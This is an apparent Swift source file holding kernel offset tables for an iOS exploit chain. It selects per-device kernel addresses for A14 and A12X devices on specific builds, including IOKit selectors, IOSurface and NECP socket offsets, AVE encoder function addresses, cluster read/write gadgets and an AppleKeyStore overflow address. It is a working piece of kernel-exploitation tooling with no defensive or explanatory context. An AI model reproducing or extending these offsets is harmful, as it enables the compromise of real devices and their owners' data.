import Foundation
import Darwin

struct LabOffTab {
    let tag: String
    let static_base: UInt64
    let sysmem_md: Int
    let iosurface_md: Int
    let gmd_elemsz: Int
    let queue_create_sel: Int
    let queue_create_size: Int
    let queue_destroy_sel: Int
    let submit_sel: Int
    let new_resource_sel: Int
    let sel7_min_in: Int
    let queue_leak: Int
    let socket_usecount: Int
    let so_necp: Int
    let sol_socket: Int
    let necp_tlv: Int
    let necp_str_len: Int
    let panic_cc8: UInt64
    let panic_cd8: UInt64
    let panic_d00: UInt64
    let fn4: UInt64
    let getter: UInt64
    let replace_bytes: UInt64
    let assign_shared: UInt64
    let cluster_w: UInt64
    let cluster_r: UInt64
    let ave_close: UInt64
    let ave_stop: UInt64
    let ave_async: UInt64
    let aks_wvek_overflow: UInt64
}

func LabOff() -> LabOffTab {
    var name = utsname()
    uname(&name)
    let machine = withUnsafeBytes(of: &name.machine) { rawBufferPointer in
        let cString = rawBufferPointer.baseAddress!.assumingMemoryBound(to: CChar.self)
        return String(cString: cString)
    }
    
    if machine.contains("iPhone13") {
        return gA14
    } else if machine.contains("iPad8") {
        return gA12X
    }
    return gA14
}

let gA14 = LabOffTab(
    tag: "A14_23F77",
    static_base: 0xFFFFFFF007004000,
    sysmem_md: 0x90,
    iosurface_md: 0x30,
    gmd_elemsz: 0xb0,
    queue_create_sel: 6,
    queue_create_size: 0x410,
    queue_destroy_sel: 7,
    submit_sel: 25,
    new_resource_sel: 0x08,
    sel7_min_in: 0x408,
    queue_leak: 0x558,
    socket_usecount: 0x23c,
    so_necp: 0x1109,
    sol_socket: 0xffff,
    necp_tlv: 0x07,
    necp_str_len: 255,
    panic_cc8: 0xFFFFFFF009857CC8,
    panic_cd8: 0xFFFFFFF009857CD8,
    panic_d00: 0xFFFFFFF009857D00,
    fn4: 0xFFFFFFF0095C94AC,
    getter: 0xFFFFFFF0095E1BDC,
    replace_bytes: 0xFFFFFFF0095E20D4,
    assign_shared: 0xFFFFFFF009857C88,
    cluster_w: 0xFFFFFFF009F97944,
    cluster_r: 0xFFFFFFF009F9DDA4,
    ave_close: 0xFFFFFFF008371094,
    ave_stop: 0xFFFFFFF008370174,
    ave_async: 0xFFFFFFF00837137C,
    aks_wvek_overflow: 0xFFFFFFF009BD96D4
)

let gA12X = LabOffTab(
    tag: "A12X_23G71",
    static_base: 0xFFFFFFF007004000,
    sysmem_md: 0x90,
    iosurface_md: 0x30,
    gmd_elemsz: 0xb0,
    queue_create_sel: 6,
    queue_create_size: 0x408,
    queue_destroy_sel: 7,
    submit_sel: 25,
    new_resource_sel: 0x08,
    sel7_min_in: 0x408,
    queue_leak: 0x550,
    socket_usecount: 0x23c,
    so_necp: 0x1109,
    sol_socket: 0xffff,
    necp_tlv: 0x07,
    necp_str_len: 255,
    panic_cc8: 0,
    panic_cd8: 0xFFFFFFF009E38A6C,
    panic_d00: 0,
    fn4: 0xFFFFFFF0094C8434,
    getter: 0xFFFFFFF0094E1070,
    replace_bytes: 0xFFFFFFF0094B8FE4,
    assign_shared: 0,
    cluster_w: 0xFFFFFFF009E6B2B0,
    cluster_r: 0xFFFFFFF009E711F0,
    ave_close: 0xFFFFFFF0083A4CF0,
    ave_stop: 0xFFFFFFF0083A3DD0,
    ave_async: 0xFFFFFFF0083A4FD8,
    aks_wvek_overflow: 0
)
